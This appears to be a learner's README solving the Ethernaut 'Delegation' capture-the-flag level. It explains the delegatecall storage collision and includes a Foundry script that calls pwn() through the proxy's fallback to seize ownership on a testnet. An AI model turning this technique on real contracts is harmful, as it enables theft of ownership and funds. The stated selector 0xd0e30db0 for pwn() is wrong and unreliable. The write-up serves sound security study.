# Ethernaut Level: Delegation - Smart Contract Auditing Journey

## Introduction
Hello! In this repository, I've solved the **Delegation** level as part of my Ethernaut challenges. I'm learning smart contract auditing by solving one level per day, and this folder (`levels/delegation/`) contains everything related to it.

**Goal:** Become the owner of the Delegation contract by exploiting the delegatecall mechanism.  
**Tools:** Foundry (for scripting and testing), Sepolia testnet.  
**Solved Date:** October 20, 2025 (Day 7).  
**Success:** Verified on the Ethernaut site!

## Contract Overview
This level features two contracts: `Delegate` (with a simple `pwn()` function to change ownership) and `Delegation` (a proxy that uses `delegatecall` in its fallback to forward calls to Delegate). The fallback enables dynamic dispatch but introduces a storage collision risk.

**Key Code Snippet (from src/Delegation.sol):**
```solidity
contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);  // Vulnerable delegatecall!
        if (result) {
            this;
        }
    }
}
```

## Vulnerability Analysis
**Main Issue: Unsafe Delegatecall (Storage Collision)**  
- The `fallback` uses `delegatecall(msg.data)`, executing Delegate's code in Delegation's context (shared storage, same msg.sender). Calling with `pwn()` calldata runs Delegate's `pwn()` but writes to Delegation's `owner` slot, changing Delegation's ownership.  
- **Security Impact:** Allows unauthorized state manipulation in proxies, potentially draining funds or altering logic. This is a classic delegatecall pitfall in upgradeable contracts.  
- **Audit Tip:** Avoid delegatecall unless storage layouts match exactly. Use `call` for isolated execution. Tools like Slither flag this with `--detect delegatecall`.

**Example:** Send `pwn()` calldata (selector: 0xd0e30db0) to Delegation—fallback delegatecalls to Delegate, setting Delegation's `owner = msg.sender`.

## Solution Steps
The attack: Use a low-level `call` with `pwn()` calldata to trigger the fallback, executing `pwn()` in Delegation's context.

1. **Setup:** Create Foundry project, set target instance address in script.
2. **Run Attack:** `forge script script/DelegatSolution.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast`.
3. **Verify:** Check `owner()` matches your address, submit on Ethernaut site.

**Key Attack Code Snippet (from script/DelegatSolution.s.sol):**
```solidity
contract DelegatSolution is Script {
    Delegation delegationInstance = Delegation(payable(<Contract_address>));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Before attack, Owner:", delegationInstance.owner());

        // pwn() calldata with low-level call
        bytes memory pwnCalldata = abi.encodeWithSignature("pwn()");
        (bool success, ) = address(delegationInstance).call(pwnCalldata);
        require(success, "Attack failed");

        console.log("After attack, Owner:", delegationInstance.owner());
        console.log("My Address:", vm.envAddress("MY_ADDRESS"));

        vm.stopBroadcast();
    }
}
```

## Test and Output
- **Local Test:** Run `anvil` and `forge test`—simulates delegatecall and ownership change.
- **Testnet Output Example:** Console log: "Before attack, Owner: 0xOriginal...", "After attack, Owner: 0xYourAddress" (matches MY_ADDRESS).

## Key Learnings
- **Auditing Skill:** Scrutinize delegatecall for storage slot overlaps—simulate with Foundry cheats.
- **EVM Concept:** Delegatecall uses caller's storage/code from callee; call uses callee's storage.
- **Prevention:** Validate calldata in fallback; use upgradeable patterns like OpenZeppelin's UUPSProxy.
- **Next Step:** Add a test to verify post-attack ownership via view call.

## Installation & Run
1. Install Foundry: `curl -L https://foundry.paradigm.xyz | bash`.
2. `cd levels/delegation`.
3. Set `.env`: `PRIVATE_KEY=your_key` and `SEPOLIA_RPC_URL=your_rpc`.
4. Run script: `forge script script/DelegatSolution.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv`.

If you have questions, comment on the issue or mention me on X (@0xZHD_X)! Next level: Force. 🚀

---

- **License:** MIT  
- **Author:** [0xZHD] - Smart Contract Auditor Learner  
- **X:** [Zahedul I Sadik](@0xZHD_X)  
- **References:** [Ethernaut Docs](https://ethernaut.openzeppelin.com/)